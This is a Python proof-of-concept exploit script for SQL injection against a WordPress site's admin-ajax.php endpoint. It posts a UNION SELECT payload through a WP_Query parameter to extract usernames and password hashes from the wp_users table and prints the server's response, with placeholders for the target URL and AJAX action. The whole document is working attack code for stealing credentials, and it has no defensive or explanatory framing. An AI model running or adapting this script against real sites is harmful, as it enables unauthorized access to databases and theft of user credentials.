import requests
from urllib.parse import urlencode

# Target Configuration
TARGET_URL = "http://target-site.com/wp-admin/admin-ajax.php"  # Target AJAX endpoint
VULNERABLE_PARAM = "query_var"  # Replace with the parameter in WP_Query
SQL_PAYLOAD = "' UNION SELECT group_concat(user_login,0x3a,user_pass), NULL FROM wp_users -- "

# Advanced Options
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

PROXY = None  # Example: {"http": "http://127.0.0.1:8080"} for Burp Suite

def exploit_sql_injection(target_url, param, payload):
    """
    Perform the SQL Injection and extract results.
    """
    print("[+] Exploiting SQL Injection in WP_Query...")

    # Construct payload
    data = {
        "action": "vulnerable_action",  # Replace with actual action
        param: payload
    }

    # URL-encoded POST data
    encoded_data = urlencode(data)
    
    try:
        # Send the malicious POST request
        response = requests.post(target_url, data=encoded_data, headers=HEADERS, proxies=PROXY)

        if response.status_code == 200:
            print("[+] Exploit sent successfully!")
            print("[+] Extracted Data:\n")
            print(response.text)
        else:
            print(f"[-] Failed to exploit. Status Code: {response.status_code}")
            print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")


def extract_wordpress_users(target_url):
    """
    Custom function to extract WordPress user credentials.
    """
    print("[+] Extracting WordPress user credentials...")
    user_extraction_payload = SQL_PAYLOAD
    exploit_sql_injection(target_url, VULNERABLE_PARAM, user_extraction_payload)


if __name__ == "__main__":
    print("[*] Starting Advanced SQL Injection PoC...")
    print("[*] Target URL:", TARGET_URL)
    print("[*] Proxy:", "Enabled" if PROXY else "Disabled")

    # Run extraction
    extract_wordpress_users(TARGET_URL)
